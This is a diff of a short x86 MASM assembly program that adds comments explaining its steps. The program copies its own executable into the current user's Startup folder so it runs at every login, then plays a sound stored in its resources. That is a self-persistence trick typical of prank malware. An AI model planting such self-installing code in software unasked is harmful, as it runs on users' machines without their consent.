@@ -65,7 +65,7 @@ strcat PROC USES eax ecx esi edi,
 	target:PTR BYTE, ; source string
 	source:PTR BYTE ; target string
 
-	INVOKE Str_length, target
+	INVOKE Str_length, target ;Get String Length
 	mov edi, target
 	add edi, eax
 	mov target, edi
@@ -82,18 +82,18 @@ strcat PROC USES eax ecx esi edi,
 strcat ENDP
 main PROC
 
-	 INVOKE GetModuleFileNameA, 0, ADDR filePath, 200
-	 INVOKE strcat, ADDR  finalCommand , ADDR filePath
+	 INVOKE GetModuleFileNameA, 0, ADDR filePath, 200 ;Get name of current file
+	 INVOKE strcat, ADDR  finalCommand , ADDR filePath ;
 	 INVOKE strcat, ADDR SecondCommand, ADDR beginningOfStartup
 	 INVOKE GetUsernameA, ADDR userName,ADDR userBuffer
 	 INVOKE strcat, ADDR SecondCommand, ADDR userName
 	 INVOKE strcat, ADDR SecondCOmmand, ADDR endOfStartup
 
-	 INVOKE CopyFileA, ADDR finalCommand, ADDR SecondCOmmand, 1
+	 INVOKE CopyFileA, ADDR finalCommand, ADDR SecondCOmmand, 1 ;Copy .exe to Startup Directory
 	
-	 INVOKE GetModuleHandleA, 00
+	 INVOKE GetModuleHandleA, 00 ;Fetch the current module, so we can pass to PlaySound
 	 mov hmod, eax
-	 INVOKE PlaySound, IDR_WAVE1, hmod, SND_RES_AND_ASYNC
+	 INVOKE PlaySound, IDR_WAVE1, hmod, SND_RES_AND_ASYNC ;Play the Music File stored in resources
 	 
 
 
